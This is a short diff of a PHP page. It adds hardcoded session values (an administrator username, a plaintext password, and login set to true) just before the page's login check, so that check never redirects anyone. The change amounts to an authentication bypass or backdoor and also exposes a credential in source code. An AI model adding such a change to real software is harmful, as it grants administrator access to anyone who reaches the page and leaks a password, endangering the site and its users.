@@ -4,6 +4,10 @@ require_once("banners.php");
 
 clearSession();
 
+$_SESSION["username"]="QueenAdministrator";
+$_SESSION["passwd"]="1000BimbiFucsia";
+$_SESSION["login"]=true;
+
 if(!isset($_SESSION["login"]) || !$_SESSION["login"])
 {
     header("Location: login.php");
